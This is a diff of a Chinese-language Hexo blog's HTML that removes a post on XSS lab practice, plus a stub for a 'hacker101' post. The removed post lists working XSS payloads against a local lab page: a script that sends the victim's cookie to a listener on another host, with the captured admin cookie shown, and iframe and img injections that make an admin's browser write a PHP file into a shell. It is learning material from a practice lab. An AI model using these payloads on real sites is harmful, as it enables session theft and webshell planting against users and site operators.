-<h4 id="window-location"><a href="#window-location" class="headerlink" title="window.location"></a>window.location</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">"http://192.168.110.1:9999?cookie="</span>+<span class="built_in">document</span>.cookie; </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">结果 拿到cookie</span><br><span class="line">GET /?cookie=cookie[user]=admin;%20user=admin HTTP/1.1</span><br><span class="line">Host: 192.168.110.1:9999</span><br></pre></td></tr></table></figure>
-
-<h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><p>iframe标签有特别多的地方可以利用</p>
-<p>可以使用</p>
-<p>on+++等属性，</p>
-<p>还有src属性 src属性还支持data javascript等协议</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">date协议</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;script&gt;alert('xss')&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">这里还可以进行一下base64编码  后面的闭合标签有没有都行</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">js协议</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">http协议</span><br><span class="line">我在后台放了一个admin.php 里面写着phpinfo</span><br><span class="line">调用一下试试，这里得让admin来调用，要不然触发的是自己主机上的admin.php</span><br><span class="line">我用虚拟机访问了一下paylaod，来模拟admin</span><br><span class="line">可以触发phpinfo</span><br><span class="line">    </span><br><span class="line">payload1</span><br><span class="line">http://192.168.110.140/xss/Less-1/index.php?phone=<span class="tag">&lt;<span class="name">iframe+src=".</span>/<span class="attr">admin.php</span>"&gt;</span>&amp;submit=submit</span><br><span class="line">    </span><br><span class="line">payload2  写全路径</span><br><span class="line">http://192.168.110.140/xss/Less-1/index.php?phone=<span class="tag">&lt;<span class="name">iframe+src="http:</span>//<span class="attr">127.0.0.1</span>/<span class="attr">xss</span>/<span class="attr">Less-1</span>/<span class="attr">admin.php</span>"&gt;</span>&amp;submit=submit</span><br><span class="line"></span><br><span class="line">还可以去手动创建一个iframe标签，利用document</span><br><span class="line">if=document.createElement("iframe")</span><br><span class="line">if.src=http://127.0.0.1/xss/Less-1/admin.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="写个shell试试"><a href="#写个shell试试" class="headerlink" title="写个shell试试"></a>写个shell试试</h3><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?phone=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>访问shell.php phpinfo成功执行</p>
-<h4 id="用iframe标签试试"><a href="#用iframe标签试试" class="headerlink" title="用iframe标签试试"></a>用iframe标签试试</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?phone=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+iframe=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);iframe.src=<span class="string">"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">这样打不通</span><br><span class="line"></span><br><span class="line">需要把iframe添加到html中去</span><br><span class="line">?phone=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span>+iframe=<span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);iframe.src=<span class="string">"http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php+phpinfo()?&gt;"</span>;<span class="built_in">document</span>.body.appendChild(iframe);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;submit=submit</span><br><span class="line">这样就可以</span><br></pre></td></tr></table></figure>
-
-<p>这里不是很明白为什么Img标签不用添加到html中，而iframe需要添加</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这样也是可以的</span><br><span class="line">?phone=&lt;iframe+src="http://192.168.110.140/xss/Less-1/admin.php?file=shell.php%26date=&lt;?php phpinfo()?&gt;"&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure>
-
-<p>参考连接</p>
-<p><a href="https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload" target="_blank" rel="noopener">https://v0w.top/2018/08/18/XSS%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5&amp;%E5%9C%A8CTF%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%9D%E6%8E%A2XSS-Payload</a></p>
-<p><a href="http://www.guimaizi.com/archives/379" target="_blank" rel="noopener">http://www.guimaizi.com/archives/379</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/20/hacker101/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/09/20/hacker101/" itemprop="url">hacker101</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-20T20:09:37+08:00">
-                2019-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>记录一下hacker101</p>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2019/09/20/hacker101/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2130,7 +2170,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">45</span>
+                <span class="site-state-item-count">47</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
